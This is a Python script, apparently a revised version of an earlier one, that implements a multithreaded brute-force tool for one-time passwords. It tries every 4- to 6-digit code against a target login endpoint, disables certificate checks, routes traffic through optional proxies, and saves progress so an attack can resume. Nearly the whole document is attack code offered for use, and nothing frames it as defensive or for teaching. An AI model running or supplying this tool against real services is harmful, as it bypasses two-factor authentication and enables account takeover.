### Updated Python Script with Multithreading, Progress, Pause/Resume, and ETA

```python
import requests
import argparse
import json
import itertools
import logging
import threading
from queue import Queue
from tqdm import tqdm
import os
import signal

# Disable SSL warnings for self-signed certificates
requests.packages.urllib3.disable_warnings()

# Set up logging
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(message)s")
logger = logging.getLogger(__name__)

# Global flag for pausing/resuming the attack
pause_flag = threading.Event()
pause_flag.set()  # Initially allow running

# Function to send GET or POST requests
def send_request(method, url, headers, data, proxies=None):
    try:
        if method == 'POST':
            logger.debug(f"POST request to {url} with data: {json.dumps(data)}")
            response = requests.post(url, headers=headers, json=data, proxies=proxies, verify=False)
        elif method == 'GET':
            logger.debug(f"GET request to {url} with params: {data}")
            response = requests.get(url, headers=headers, params=data, proxies=proxies, verify=False)
        
        logger.info(f"Response [HTTP {response.status_code}]: {response.text}")
        return response
    except requests.exceptions.RequestException as e:
        logger.error(f"Request failed: {e}")
        return None

# Function to generate OTP combinations (4 to 6 digits)
def generate_otp_combinations():
    otp_combinations = []
    for length in range(4, 7):  # Generate 4, 5, and 6 digit OTPs
        otp_combinations.extend(itertools.product('0123456789', repeat=length))
    return [''.join(otp) for otp in otp_combinations]

# Worker function to handle OTP brute forcing with threads
def worker(method, url, headers, original_data, otp_param, queue, proxies, success_text=None, success_status=None, progress=None):
    while not queue.empty():
        pause_flag.wait()  # Check if the pause flag is set; pause if not
        otp = queue.get()

        # Extract thread name to show which thread is testing which OTP
        thread_name = threading.current_thread().name
        logger.debug(f"Thread {thread_name} testing OTP: {otp}")

        injected_data = original_data.copy()
        injected_data[otp_param] = otp

        response = send_request(method, url, headers, injected_data, proxies)

        # Check for success based on response text or HTTP status code
        if response:
            if success_text and success_text in response.text:
                logger.info(f"Success! Correct OTP found by thread {thread_name}: {otp}")
                break
            elif success_status and response.status_code == success_status:
                logger.info(f"Success! Correct OTP found by thread {thread_name}: {otp}")
                break

        if progress:
            progress.update(1)  # Update the progress bar
        queue.task_done()

# Save current progress to a file
def save_progress(filename, tested_otps):
    with open(filename, 'w') as f:
        for otp in tested_otps:
            f.write(f"{otp}\n")
    logger.info(f"Progress saved to {filename}")

# Load progress from file to resume the brute force
def load_progress(filename):
    if not os.path.exists(filename):
        return set()

    with open(filename, 'r') as f:
        tested_otps = set(line.strip() for line in f)
    logger.info(f"Loaded {len(tested_otps)} tested OTPs from {filename}")
    return tested_otps

# Function to brute force the OTP parameter with multithreading
def brute_force_otp(method, url, headers, original_data, otp_param, proxies=None, num_threads=10, success_text=None, success_status=None, progress_file=None):
    otp_combinations = generate_otp_combinations()
    tested_otps = load_progress(progress_file)  # Load previously tested OTPs

    # Filter out already tested OTPs
    remaining_otps = [otp for otp in otp_combinations if otp not in tested_otps]

    queue = Queue()

    logger.info(f"Starting brute force attack on parameter '{otp_param}' with {len(remaining_otps)} combinations using {num_threads} threads.")

    # Fill the queue with remaining OTP combinations
    for otp in remaining_otps:
        queue.put(otp)

    progress = tqdm(total=len(remaining_otps), desc="Brute Force Progress", unit=" OTP")

    # Create worker threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(method, url, headers, original_data, otp_param, queue, proxies, success_text, success_status, progress))
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    try:
        for thread in threads:
            thread.join()

        queue.join()
        progress.close()

    except KeyboardInterrupt:
        logger.info("Brute force interrupted by user.")
        tested_otps.update(set(remaining_otps) - set(queue.queue))  # Add tested OTPs to set
        save_progress(progress_file, tested_otps)  # Save progress
        exit(0)

# Function to pause and resume the brute force attack
def toggle_pause(signal, frame):
    if pause_flag.is_set():
        logger.info("Pausing brute force...")
        pause_flag.clear()
    else:
        logger.info("Resuming brute force...")
        pause_flag.set()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="OTP Brute Force Tool with Multithreading, Progress, Pause/Resume, and ETA")

    # Arguments for HTTP method, URL, data, headers, OTP parameter, and proxy
    parser.add_argument("-m", "--method", required=True, choices=["GET", "POST"], help="HTTP method (GET or POST)")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-d", "--datafile", required=True, help="Path to JSON file for POST data or GET parameters")
    parser.add_argument("-H", "--headersfile", required=True, help="Path to JSON file for headers")
    parser.add_argument("-t", "--target", required=True, help="The parameter to inject the OTP for brute forcing")
    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-T", "--threads", type=int, default=10, help="Number of threads to use for brute force attack")
    parser.add_argument("-S", "--success-text", help="Text to identify a successful OTP response")
    parser.add_argument("-C", "--success-status", type=int, help="HTTP status code to identify a successful OTP response")
    parser.add_argument("--progress-file", default="brute_force_progress.txt", help="File to save and load brute force progress")

    args = parser.parse_args()

    # Load POST data or GET params and headers from the provided JSON files
    with open(args.datafile, 'r') as f:
        request_data = json.load(f)
    
    with open(args.headersfile, 'r') as f:
        headers = json.load(f)
    
    # Proxy settings (if provided)
    proxies = {
        "http": args.proxy,
        "https": args.proxy
    } if args.proxy else None

    # Register signal handler for pause/resume functionality (Ctrl+C)
    signal.signal(signal.SIGUSR1, toggle_pause)

    # Start brute forcing the OTP parameter with multithreading, progress, pause/resume, and ETA
    brute_force_otp(args.method, args.url, headers, request_data, args.target, proxies, num_threads=args.threads, success_text=args.success_text, success_status=args.success_status, progress_file=args.progress_file)
```
